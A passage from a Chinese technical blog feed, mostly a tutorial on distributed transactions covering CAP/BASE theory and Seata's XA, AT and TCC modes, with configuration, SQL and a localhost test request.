class="line">        Object result = method.invoke(student);</span><br><span class="line">        <span class="comment">//4.打印一下返回值</span></span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 总结图示<br><img src="https://pic.imgdb.cn/item/639a8a2cb1fccdcd36d2b787.png" alt="image.png"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-类加载器&quot;&gt;&lt;a href=&quot;#1-类加载器&quot; class=&quot;headerlink&quot; title=&quot;1. 类加载器&quot;&gt;&lt;/a&gt;1. 类加载器&lt;/h2&gt;&lt;h3 id=&quot;1-1-概念&quot;&gt;&lt;a href=&quot;#1-1-概念&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="Java" scheme="http://zephyr-cyber.github.io/categories/Java/"/>
    
    <category term="基础" scheme="http://zephyr-cyber.github.io/categories/Java/%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Java基础" scheme="http://zephyr-cyber.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="Java-基础-类加载器&amp;反射" scheme="http://zephyr-cyber.github.io/tags/Java-%E5%9F%BA%E7%A1%80-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8-%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>分布式事务</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/3452718766.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/3452718766.html</id>
    <published>2022-09-18T13:45:28.000Z</published>
    <updated>2022-12-15T03:08:21.040Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h1><h1 id="1-分布式事务问题"><a href="#1-分布式事务问题" class="headerlink" title="1.分布式事务问题"></a>1.分布式事务问题</h1><h2 id="1-1-本地事务"><a href="#1-1-本地事务" class="headerlink" title="1.1.本地事务"></a>1.1.本地事务</h2><p>本地事务，也就是传统的<strong>单机事务</strong>。在传统数据库事务中，必须要满足四个原则：</p><p><img src="https://pic.imgdb.cn/item/639a0827b1fccdcd363f4f09.png"></p><h2 id="1-2-分布式事务"><a href="#1-2-分布式事务" class="headerlink" title="1.2.分布式事务"></a>1.2.分布式事务</h2><p><strong>分布式事务</strong>，就是指不是在单个服务或单个数据库架构下，产生的事务，例如：</p><ul><li>跨数据源的分布式事务</li><li>跨服务的分布式事务</li><li>综合情况</li></ul><p>在数据库水平拆分、服务垂直拆分之后，一个业务操作通常要跨多个数据库、服务才能完成。例如电商行业中比较常见的下单付款案例，包括下面几个行为：</p><ul><li>创建新订单</li><li>扣减商品库存</li><li>从用户账户余额扣除金额</li></ul><p>完成上面的操作需要访问三个不同的微服务和三个不同的数据库。</p><p><img src="https://pic.imgdb.cn/item/639a0827b1fccdcd363f4f0d.png"></p><p>订单的创建、库存的扣减、账户扣款在每一个服务和数据库内是一个本地事务，可以保证ACID原则。</p><p>但是当我们把三件事情看做一个”业务”，要满足保证“业务”的原子性，要么所有操作全部成功，要么全部失败，不允许出现部分成功部分失败的现象，这就是<strong>分布式系统下的事务</strong>了。</p><p>此时ACID难以满足，这是分布式事务要解决的问题</p><h2 id="1-3-演示分布式事务问题"><a href="#1-3-演示分布式事务问题" class="headerlink" title="1.3.演示分布式事务问题"></a>1.3.演示分布式事务问题</h2><p>我们通过一个案例来演示分布式事务的问题：</p><p>1）<strong>创建数据库，名为seata_demo，导入资料SQL文件：</strong></p><p>2）<strong>导入微服务：</strong></p><p><img src="https://pic.imgdb.cn/item/639a0827b1fccdcd363f4f1c.png"></p><p>微服务结构如下：</p><p><img src="https://pic.imgdb.cn/item/639a0827b1fccdcd363f4f28.png"></p><p>其中：</p><p>seata-demo：父工程，负责管理项目依赖</p><ul><li>account-service：账户服务，负责管理用户的资金账户。提供扣减余额的接口</li><li>storage-service：库存服务，负责管理商品库存。提供扣减库存的接口</li><li>order-service：订单服务，负责管理订单。创建订单时，需要调用account-service和storage-service</li></ul><p><strong>3）启动nacos、所有微服务</strong></p><p><strong>4）测试下单功能，发出Post请求：</strong></p><p>请求如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://localhost:8082/order?userId=user202103032042012&amp;commodityCode=100202003032041&amp;count=20&amp;money=200&#x27;</span></span><br></pre></td></tr></table></figure><p>如图：</p><p><img src="https://pic.imgdb.cn/item/639a0827b1fccdcd363f4f40.png"></p><p>测试发现，当库存不足时，如果余额已经扣减，并不会回滚，出现了分布式事务问题。</p><h1 id="2-理论基础"><a href="#2-理论基础" class="headerlink" title="2.理论基础"></a>2.理论基础</h1><p>解决分布式事务问题，需要一些分布式系统的基础知识作为理论指导。</p><h2 id="2-1-CAP定理"><a href="#2-1-CAP定理" class="headerlink" title="2.1.CAP定理"></a>2.1.CAP定理</h2><p>1998年，加州大学的计算机科学家 Eric Brewer 提出，分布式系统有三个指标。</p><blockquote><ul><li>Consistency（一致性）</li><li>Availability（可用性）</li><li>Partition tolerance （分区容错性）</li></ul></blockquote><p><img src="https://pic.imgdb.cn/item/639a0821b1fccdcd363f466c.png"></p><p>它们的第一个字母分别是 C、A、P。</p><p>Eric Brewer 说，这三个指标不可能同时做到。这个结论就叫做 CAP 定理。</p><h3 id="2-1-1-一致性"><a href="#2-1-1-一致性" class="headerlink" title="2.1.1.一致性"></a>2.1.1.一致性</h3><p>Consistency（一致性）：用户访问分布式系统中的任意节点，得到的数据必须一致。</p><p>比如现在包含两个节点，其中的初始数据是一致的：</p><p><img src="https://pic.imgdb.cn/item/639a0821b1fccdcd363f4673.png"></p><p>当我们修改其中一个节点的数据时，两者的数据产生了差异：</p><p><img src="https://pic.imgdb.cn/item/639a0821b1fccdcd363f467b.png"></p><p>要想保住一致性，就必须实现node01 到 node02的数据 同步：</p><p><img src="https://pic.imgdb.cn/item/639a0821b1fccdcd363f46c6.png"></p><h3 id="2-1-2-可用性"><a href="#2-1-2-可用性" class="headerlink" title="2.1.2.可用性"></a>2.1.2.可用性</h3><p>Availability （可用性）：用户访问集群中的任意健康节点，必须能得到响应，而不是超时或拒绝。</p><p>如图，有三个节点的集群，访问任何一个都可以及时得到响应：</p><p><img src="https://pic.imgdb.cn/item/639a0821b1fccdcd363f46cc.png"></p><p>当有部分节点因为网络故障或其它原因无法访问时，代表节点不可用：</p><p><img src="https://pic.imgdb.cn/item/639a081cb1fccdcd363f4077.png"></p><h3 id="2-1-3-分区容错"><a href="#2-1-3-分区容错" class="headerlink" title="2.1.3.分区容错"></a>2.1.3.分区容错</h3><p><strong>Partition（分区）</strong>：因为网络故障或其它原因导致分布式系统中的部分节点与其它节点失去连接，形成独立分区。</p><p><img src="https://pic.imgdb.cn/item/639a081cb1fccdcd363f407c.png"></p><p><strong>Tolerance（容错）</strong>：在集群出现分区时，整个系统也要持续对外提供服务</p><h3 id="2-1-4-矛盾"><a href="#2-1-4-矛盾" class="headerlink" title="2.1.4.矛盾"></a>2.1.4.矛盾</h3><p>在分布式系统中，系统间的网络不能100%保证健康，一定会有故障的时候，而服务有必须对外保证服务。因此Partition Tolerance不可避免。</p><p>当节点接收到新的数据变更时，就会出现问题了：</p><p><img src="https://pic.imgdb.cn/item/639a081cb1fccdcd363f4081.png"></p><p>如果此时要保证<strong>一致性</strong>，就必须等待网络恢复，完成数据同步后，整个集群才对外提供服务，服务处于阻塞状态，不可用。</p><p>如果此时要保证<strong>可用性</strong>，就不能等待网络恢复，那node01、node02与node03之间就会出现数据不一致。</p><p>也就是说，在P一定会出现的情况下，A和C之间只能实现一个。</p><h2 id="2-2-BASE理论"><a href="#2-2-BASE理论" class="headerlink" title="2.2.BASE理论"></a>2.2.BASE理论</h2><p>BASE理论是对CAP的一种解决思路，包含三个思想：</p><ul><li><strong>Basically Available</strong> <strong>（基本可用）</strong>：分布式系统在出现故障时，允许损失部分可用性，即保证核心可用。</li><li><strong>Soft State（软状态）：</strong>在一定时间内，允许出现中间状态，比如临时的不一致状态。</li><li><strong>Eventually Consistent（最终一致性）</strong>：虽然无法保证强一致性，但是在软状态结束后，最终达到数据一致。</li></ul><h2 id="2-3-解决分布式事务的思路"><a href="#2-3-解决分布式事务的思路" class="headerlink" title="2.3.解决分布式事务的思路"></a>2.3.解决分布式事务的思路</h2><p>分布式事务最大的问题是各个子事务的一致性问题，因此可以借鉴CAP定理和BASE理论，有两种解决思路：</p><ul><li><p>AP模式：各子事务分别执行和提交，允许出现结果不一致，然后采用弥补措施恢复数据即可，实现最终一致。</p></li><li><p>CP模式：各个子事务执行后互相等待，同时提交，同时回滚，达成强一致。但事务等待过程中，处于弱可用状态。</p></li></ul><p>但不管是哪一种模式，都需要在子系统事务之间互相通讯，协调事务状态，也就是需要一个**事务协调者(TC)**：</p><p><img src="https://pic.imgdb.cn/item/639a081cb1fccdcd363f4090.png"></p><p>这里的子系统事务，称为<strong>分支事务</strong>；有关联的各个分支事务在一起称为<strong>全局事务</strong>。</p><h1 id="3-初识Seata"><a href="#3-初识Seata" class="headerlink" title="3.初识Seata"></a>3.初识Seata</h1><p>Seata是 2019 年 1 月份蚂蚁金服和阿里巴巴共同开源的分布式事务解决方案。致力于提供高性能和简单易用的分布式事务服务，为用户打造一站式的分布式解决方案。</p><p>官网地址：<a href="http://seata.io/%EF%BC%8C%E5%85%B6%E4%B8%AD%E7%9A%84%E6%96%87%E6%A1%A3%E3%80%81%E6%92%AD%E5%AE%A2%E4%B8%AD%E6%8F%90%E4%BE%9B%E4%BA%86%E5%A4%A7%E9%87%8F%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%E3%80%81%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%82">http://seata.io/，其中的文档、播客中提供了大量的使用说明、源码分析。</a></p><h2 id="3-1-Seata的架构"><a href="#3-1-Seata的架构" class="headerlink" title="3.1.Seata的架构"></a>3.1.Seata的架构</h2><p>Seata事务管理中有三个重要的角色：</p><ul><li><p><strong>TC (Transaction Coordinator) -</strong> <strong>事务协调者：</strong>维护全局和分支事务的状态，协调全局事务提交或回滚。</p></li><li><p><strong>TM (Transaction Manager) -</strong> <strong>事务管理器：</strong>定义全局事务的范围、开始全局事务、提交或回滚全局事务。</p></li><li><p><strong>RM (Resource Manager) -</strong> <strong>资源管理器：</strong>管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。</p></li></ul><p>整体的架构如图：</p><p><img src="https://pic.imgdb.cn/item/639a081cb1fccdcd363f409d.png"></p><p>Seata基于上述架构提供了四种不同的分布式事务解决方案：</p><ul><li>XA模式：强一致性分阶段事务模式，牺牲了一定的可用性，无业务侵入</li><li>TCC模式：最终一致的分阶段事务模式，有业务侵入</li><li>AT模式：最终一致的分阶段事务模式，无业务侵入，也是Seata的默认模式</li><li>SAGA模式：长事务模式，有业务侵入</li></ul><p>无论哪种方案，都离不开TC，也就是事务的协调者。</p><h2 id="3-2-部署TC服务"><a href="#3-2-部署TC服务" class="headerlink" title="3.2.部署TC服务"></a>3.2.部署TC服务</h2><h2 id="3-3-微服务集成Seata"><a href="#3-3-微服务集成Seata" class="headerlink" title="3.3.微服务集成Seata"></a>3.3.微服务集成Seata</h2><h3 id="3-3-1-引入依赖"><a href="#3-3-1-引入依赖" class="headerlink" title="3.3.1.引入依赖"></a>3.3.1.引入依赖</h3><p>首先，在order-service中引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--seata--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-seata<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--版本较低，1.3.0，因此排除--&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--seata starter 采用1.4.2版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;seata.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-3-2-配置TC地址"><a href="#3-3-2-配置TC地址" class="headerlink" title="3.3.2.配置TC地址"></a>3.3.2.配置TC地址</h3><p>在order-service中的application.yml中，配置TC服务信息，通过注册中心nacos，结合服务名称获取TC地址：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">seata:</span></span><br><span class="line">  <span class="attr">registry:</span> <span class="comment"># TC服务注册中心的配置，微服务根据这些信息去注册中心获取tc服务地址</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">nacos</span> <span class="comment"># 注册中心类型 nacos</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span> <span class="comment"># nacos地址</span></span><br><span class="line">      <span class="attr">namespace:</span> <span class="string">&quot;&quot;</span> <span class="comment"># namespace，默认为空</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">DEFAULT_GROUP</span> <span class="comment"># 分组，默认是DEFAULT_GROUP</span></span><br><span class="line">      <span class="attr">application:</span> <span class="string">seata-tc-server</span> <span class="comment"># seata服务名称</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">      <span class="attr">password:</span> <span class="string">nacos</span></span><br><span class="line">  <span class="attr">tx-service-group:</span> <span class="string">seata-demo</span> <span class="comment"># 事务组名称</span></span><br><span class="line">  <span class="attr">service:</span></span><br><span class="line">    <span class="attr">vgroup-mapping:</span> <span class="comment"># 事务组与cluster的映射关系</span></span><br><span class="line">      <span class="attr">seata-demo:</span> <span class="string">SH</span></span><br></pre></td></tr></table></figure><p>微服务如何根据这些配置寻找TC的地址呢？</p><p>我们知道注册到Nacos中的微服务，确定一个具体实例需要四个信息：</p><ul><li>namespace：命名空间</li><li>group：分组</li><li>application：服务名</li><li>cluster：集群名</li></ul><p>以上四个信息，在刚才的yaml文件中都能找到：</p><p><img src="https://pic.imgdb.cn/item/639a0817b1fccdcd363f3b0c.png"></p><p>namespace为空，就是默认的public</p><p>结合起来，TC服务的信息就是：public@DEFAULT_GROUP@seata-tc-server@SH，这样就能确定TC服务集群了。然后就可以去Nacos拉取对应的实例信息了。</p><h1 id="4-实践"><a href="#4-实践" class="headerlink" title="4.实践"></a>4.实践</h1><p>学习下Seata中的四种不同的事务模式。</p><h2 id="4-1-XA模式"><a href="#4-1-XA模式" class="headerlink" title="4.1.XA模式"></a>4.1.XA模式</h2><p>XA 规范 是 X/Open 组织定义的分布式事务处理（DTP，Distributed Transaction Processing）标准，XA 规范 描述了全局的TM与局部的RM之间的接口，几乎所有主流的数据库都对 XA 规范 提供了支持。</p><h3 id="4-1-1-两阶段提交"><a href="#4-1-1-两阶段提交" class="headerlink" title="4.1.1.两阶段提交"></a>4.1.1.两阶段提交</h3><p>XA是规范，目前主流数据库都实现了这种规范，实现的原理都是基于两阶段提交。</p><p>正常情况：</p><p><img src="https://pic.imgdb.cn/item/639a0817b1fccdcd363f3b10.png"></p><p>异常情况：</p><p><img src="https://pic.imgdb.cn/item/639a0817b1fccdcd363f3b15.png"></p><p>一阶段：</p><ul><li>事务协调者通知每个事物参与者执行本地事务</li><li>本地事务执行完成后报告事务执行状态给事务协调者，此时事务不提交，继续持有数据库锁</li></ul><p>二阶段：</p><ul><li>事务协调者基于一阶段的报告来判断下一步操作<ul><li>如果一阶段都成功，则通知所有事务参与者，提交事务</li><li>如果一阶段任意一个参与者失败，则通知所有事务参与者回滚事务</li></ul></li></ul><h3 id="4-1-2-Seata的XA模型"><a href="#4-1-2-Seata的XA模型" class="headerlink" title="4.1.2.Seata的XA模型"></a>4.1.2.Seata的XA模型</h3><p>Seata对原始的XA模式做了简单的封装和改造，以适应自己的事务模型，基本架构如图：</p><p><img src="https://pic.imgdb.cn/item/639a0817b1fccdcd363f3b1f.png"></p><p>RM一阶段的工作：</p><p>​    ① 注册分支事务到TC</p><p>​    ② 执行分支业务sql但不提交</p><p>​    ③ 报告执行状态到TC</p><p>TC二阶段的工作：</p><ul><li><p>TC检测各分支事务执行状态</p><p>a.如果都成功，通知所有RM提交事务</p><p>b.如果有失败，通知所有RM回滚事务</p></li></ul><p>RM二阶段的工作：</p><ul><li>接收TC指令，提交或回滚事务</li></ul><h3 id="4-1-3-优缺点"><a href="#4-1-3-优缺点" class="headerlink" title="4.1.3.优缺点"></a>4.1.3.优缺点</h3><p>XA模式的优点是什么？</p><ul><li>事务的强一致性，满足ACID原则。</li><li>常用数据库都支持，实现简单，并且没有代码侵入</li></ul><p>XA模式的缺点是什么？</p><ul><li>因为一阶段需要锁定数据库资源，等待二阶段结束才释放，性能较差</li><li>依赖关系型数据库实现事务</li></ul><h3 id="4-1-4-实现XA模式"><a href="#4-1-4-实现XA模式" class="headerlink" title="4.1.4.实现XA模式"></a>4.1.4.实现XA模式</h3><p>Seata的starter已经完成了XA模式的自动装配，实现非常简单，步骤如下：</p><p>1）修改application.yml文件（每个参与事务的微服务），开启XA模式：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">seata:</span></span><br><span class="line">  <span class="attr">data-source-proxy-mode:</span> <span class="string">XA</span></span><br></pre></td></tr></table></figure><p>2）给发起全局事务的入口方法添加@GlobalTransactional注解:</p><p>本例中是OrderServiceImpl中的create方法.</p><p><img src="https://pic.imgdb.cn/item/639a0817b1fccdcd363f3b26.png"></p><p>3）重启服务并测试</p><p>重启order-service，再次测试，发现无论怎样，三个微服务都能成功回滚。</p><h2 id="4-2-AT模式"><a href="#4-2-AT模式" class="headerlink" title="4.2.AT模式"></a>4.2.AT模式</h2><p>AT模式同样是分阶段提交的事务模型，不过缺弥补了XA模型中资源锁定周期过长的缺陷。</p><h3 id="4-2-1-Seata的AT模型"><a href="#4-2-1-Seata的AT模型" class="headerlink" title="4.2.1.Seata的AT模型"></a>4.2.1.Seata的AT模型</h3><p>基本流程图：</p><p><img src="https://pic.imgdb.cn/item/639a0811b1fccdcd363f32e1.png"></p><p>阶段一RM的工作：</p><ul><li>注册分支事务</li><li>记录undo-log（数据快照）</li><li>执行业务sql并提交</li><li>报告事务状态</li></ul><p>阶段二提交时RM的工作：</p><ul><li>删除undo-log即可</li></ul><p>阶段二回滚时RM的工作：</p><ul><li>根据undo-log恢复数据到更新前</li></ul><h3 id="4-2-2-流程梳理"><a href="#4-2-2-流程梳理" class="headerlink" title="4.2.2.流程梳理"></a>4.2.2.流程梳理</h3><p>我们用一个真实的业务来梳理下AT模式的原理。</p><p>比如，现在又一个数据库表，记录用户余额：</p><table><thead><tr><th><strong>id</strong></th><th><strong>money</strong></th></tr></thead><tbody><tr><td>1</td><td>100</td></tr></tbody></table><p>其中一个分支业务要执行的SQL为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update tb_account <span class="keyword">set</span> money <span class="operator">=</span> money <span class="operator">-</span> <span class="number">10</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>AT模式下，当前分支事务执行流程如下：</p><p>一阶段：</p><p>1）TM发起并注册全局事务到TC</p><p>2）TM调用分支事务</p><p>3）分支事务准备执行业务SQL</p><p>4）RM拦截业务SQL，根据where条件查询原始数据，形成快照。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;id&quot;</span>: <span class="number">1</span>, <span class="attr">&quot;money&quot;</span>: <span class="number">100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5）RM执行业务SQL，提交本地事务，释放数据库锁。此时 <code>money = 90</code></p><p>6）RM报告本地事务状态给TC</p><p>二阶段：</p><p>1）TM通知TC事务结束</p><p>2）TC检查分支事务状态</p><p>​     a）如果都成功，则立即删除快照</p><p>​     b）如果有分支事务失败，需要回滚。读取快照数据（<code>&#123;&quot;id&quot;: 1, &quot;money&quot;: 100&#125;</code>），将快照恢复到数据库。此时数据库再次恢复为100</p><p>流程图：</p><p><img src="https://pic.imgdb.cn/item/639a0811b1fccdcd363f32e8.png"></p><h3 id="4-2-3-AT与XA的区别"><a href="#4-2-3-AT与XA的区别" class="headerlink" title="4.2.3.AT与XA的区别"></a>4.2.3.AT与XA的区别</h3><p>简述AT模式与XA模式最大的区别是什么？</p><ul><li>XA模式一阶段不提交事务，锁定资源；AT模式一阶段直接提交，不锁定资源。</li><li>XA模式依赖数据库机制实现回滚；AT模式利用数据快照实现数据回滚。</li><li>XA模式强一致；AT模式最终一致</li></ul><h3 id="4-2-4-脏写问题"><a href="#4-2-4-脏写问题" class="headerlink" title="4.2.4.脏写问题"></a>4.2.4.脏写问题</h3><p>在多线程并发访问AT模式的分布式事务时，有可能出现脏写问题，如图：</p><p><img src="https://pic.imgdb.cn/item/639a0811b1fccdcd363f32f0.png"></p><p>解决思路就是引入了全局锁的概念。在释放DB锁之前，先拿到全局锁。避免同一时刻有另外一个事务来操作当前数据。</p><p><img src="https://pic.imgdb.cn/item/639a0811b1fccdcd363f32f9.png"></p><h3 id="4-2-5-优缺点"><a href="#4-2-5-优缺点" class="headerlink" title="4.2.5.优缺点"></a>4.2.5.优缺点</h3><p>AT模式的优点：</p><ul><li>一阶段完成直接提交事务，释放数据库资源，性能比较好</li><li>利用全局锁实现读写隔离</li><li>没有代码侵入，框架自动完成回滚和提交</li></ul><p>AT模式的缺点：</p><ul><li>两阶段之间属于软状态，属于最终一致</li><li>框架的快照功能会影响性能，但比XA模式要好很多</li></ul><h3 id="4-2-6-实现AT模式"><a href="#4-2-6-实现AT模式" class="headerlink" title="4.2.6.实现AT模式"></a>4.2.6.实现AT模式</h3><p>AT模式中的快照生成、回滚等动作都是由框架自动完成，没有任何代码侵入，因此实现非常简单。</p><p>只不过，AT模式需要一个表来记录全局锁、另一张表来记录数据快照undo_log。</p><p>1）导入数据库表，记录全局锁</p><p>导入课前资料提供的Sql文件：seata-at.sql，其中lock_table导入到TC服务关联的数据库，undo_log表导入到微服务关联的数据库：</p><p>2）修改application.yml文件，将事务模式修改为AT模式即可：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">seata:</span></span><br><span class="line">  <span class="attr">data-source-proxy-mode:</span> <span class="string">AT</span> <span class="comment"># 默认就是AT</span></span><br></pre></td></tr></table></figure><h2 id="4-3-TCC模式"><a href="#4-3-TCC模式" class="headerlink" title="4.3.TCC模式"></a>4.3.TCC模式</h2><p>TCC模式与AT模式非常相似，每阶段都是独立事务，不同的是TCC通过人工编码来实现数据恢复。需要实现三个方法：</p><ul><li><p>Try：资源的检测和预留； </p></li><li><p>Confirm：完成资源操作业务；要求 Try 成功 Confirm 一定要能成功。</p></li><li><p>Cancel：预留资源释放，可以理解为try的反向操作。</p></li></ul><h3 id="4-3-1-流程分析"><a href="#4-3-1-流程分析" class="headerlink" title="4.3.1.流程分析"></a>4.3.1.流程分析</h3><p>举例，一个扣减用户余额的业务。假设账户A原来余额是100，需要余额扣减30元。</p><ul><li><strong>阶段一（ Try ）</strong>：检查余额是否充足，如果充足则冻结金额增加30元，可用余额扣除30</li></ul><p>初识余额：</p><p>余额充足，可以冻结：</p><p>此时，总金额 = 冻结金额 + 可用金额，数量依然是100不变。事务直接提交无需等待其它事务。</p><ul><li>**阶段二（Confirm)**：假如要提交（Confirm），则冻结金额扣减30</li></ul><p>确认可以提交，不过之前可用金额已经扣减过了，这里只要清除冻结金额就好了：</p><p>此时，总金额 = 冻结金额 + 用金额 = 0 + 70  = 70元</p><ul><li>**阶段二(Canncel)**：如果要回滚（Cancel），则冻结金额扣减30，可用余额增加30</li></ul><p>需要回滚，那么就要释放冻结金额，恢复可用金额：</p><h3 id="4-3-2-Seata的TCC模型"><a href="#4-3-2-Seata的TCC模型" class="headerlink" title="4.3.2.Seata的TCC模型"></a>4.3.2.Seata的TCC模型</h3><p>Seata中的TCC模型依然延续之前的事务架构，如图：</p><p><img src="https://pic.imgdb.cn/item/639a0811b1fccdcd363f32e1.png"></p><h3 id="4-3-3-优缺点"><a href="#4-3-3-优缺点" class="headerlink" title="4.3.3.优缺点"></a>4.3.3.优缺点</h3><p>TCC模式的每个阶段是做什么的？</p><ul><li>Try：资源检查和预留</li><li>Confirm：业务执行和提交</li><li>Cancel：预留资源的释放</li></ul><p>TCC的优点是什么？</p><ul><li>一阶段完成直接提交事务，释放数据库资源，性能好</li><li>相比AT模型，无需生成快照，无需使用全局锁，性能最强</li><li>不依赖数据库事务，而是依赖补偿操作，可以用于非事务型数据库</li></ul><p>TCC的缺点是什么？</p><ul><li>有代码侵入，需要人为编写try、Confirm和Cancel接口，太麻烦</li><li>软状态，事务是最终一致</li><li>需要考虑Confirm和Cancel的失败情况，做好幂等处理</li></ul><h3 id="4-3-4-事务悬挂和空回滚"><a href="#4-3-4-事务悬挂和空回滚" class="headerlink" title="4.3.4.事务悬挂和空回滚"></a>4.3.4.事务悬挂和空回滚</h3><h4 id="1）空回滚"><a href="#1）空回滚" class="headerlink" title="1）空回滚"></a>1）空回滚</h4><p>当某分支事务的try阶段<strong>阻塞</strong>时，可能导致全局事务超时而触发二阶段的cancel操作。在未执行try操作时先执行了cancel操作，这时cancel不能做回滚，就是<strong>空回滚</strong>。</p><p>如图：</p><p><img src="https://pic.imgdb.cn/item/639a0809b1fccdcd363f29f0.png"></p><p>执行cancel操作时，应当判断try是否已经执行，如果尚未执行，则应该空回滚。</p><h4 id="2）业务悬挂"><a href="#2）业务悬挂" class="headerlink" title="2）业务悬挂"></a>2）业务悬挂</h4><p>对于已经空回滚的业务，之前被阻塞的try操作恢复，继续执行try，就永远不可能confirm或cancel ，事务一直处于中间状态，这就是<strong>业务悬挂</strong>。</p><p>执行try操作时，应当判断cancel是否已经执行过了，如果已经执行，应当阻止空回滚后的try操作，避免悬挂</p><h3 id="4-3-5-实现TCC模式"><a href="#4-3-5-实现TCC模式" class="headerlink" title="4.3.5.实现TCC模式"></a>4.3.5.实现TCC模式</h3><p>解决空回滚和业务悬挂问题，必须要记录当前事务状态，是在try、还是cancel？</p><h4 id="1）思路分析"><a href="#1）思路分析" class="headerlink" title="1）思路分析"></a>1）思路分析</h4><p>这里我们定义一张表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `account_freeze_tbl` (</span><br><span class="line">  `xid` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `user_id` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;用户id&#x27;</span>,</span><br><span class="line">  `freeze_money` <span class="type">int</span>(<span class="number">11</span>) unsigned <span class="keyword">DEFAULT</span> <span 